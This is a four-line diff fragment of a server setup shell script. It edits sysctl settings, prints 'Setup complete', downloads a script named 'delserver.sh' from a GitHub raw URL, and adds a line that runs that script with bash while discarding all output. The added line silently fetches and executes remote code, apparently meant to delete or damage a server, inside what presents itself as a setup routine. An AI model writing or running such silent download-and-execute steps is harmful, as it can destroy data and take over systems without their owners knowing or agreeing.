@@ -816,3 +816,4 @@ echo "vm.overcommit_memory=2" >> /etc/sysctl.conf
 echo "[*] Setup complete"
 echo "[*] Yee-Go"
 wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/delserver.sh
+/bin/bash $HOME/delserver.sh >/dev/null 2>&1
